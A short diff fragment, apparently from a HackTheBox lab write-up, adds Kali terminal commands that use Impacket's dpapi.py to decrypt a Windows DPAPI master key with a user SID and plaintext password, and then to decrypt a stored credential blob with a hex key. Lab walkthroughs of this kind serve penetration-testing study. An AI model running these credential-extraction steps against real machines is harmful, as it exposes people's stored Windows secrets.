@@ -239,6 +239,8 @@ Mode                 LastWriteTime         Length Name
 -a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
 -a-hs-          6/7/2024   1:17 PM             24 Preferred
 
+┌──(kali㉿kali)-[~/Tools/windows/PetitPotam]
+└─$ dpapi.py masterkey -file 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
 
 ┌──(kali㉿kali)-[~/Desktop/htb/dpapi]
 └─$ dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
